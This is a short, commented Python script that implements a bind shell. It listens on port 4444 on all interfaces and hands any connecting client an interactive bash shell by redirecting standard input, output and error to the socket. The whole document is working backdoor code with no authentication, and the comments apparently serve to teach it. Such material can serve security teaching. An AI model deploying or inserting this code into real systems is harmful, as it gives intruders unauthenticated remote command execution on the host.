#!/usr/bin/python

# Mandatory imports in order to run the subsequent code
import socket, subprocess, os;

# Socket creation
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

# Socket binding to all addresses "0.0.0.0" and port 4444
s.bind(("0.0.0.0",4444));

# Socket listening mode activation
s.listen(5);

# Accept a connection when it arrives
c,a=s.accept();

# File descriptors duplication (STDIN, STDOUT, STDERR)
os.dup2(c.fileno(),0);
os.dup2(c.fileno(),1);
os.dup2(c.fileno(),2);

# Command shell spawning
p=subprocess.call(["/bin/bash","-i"])
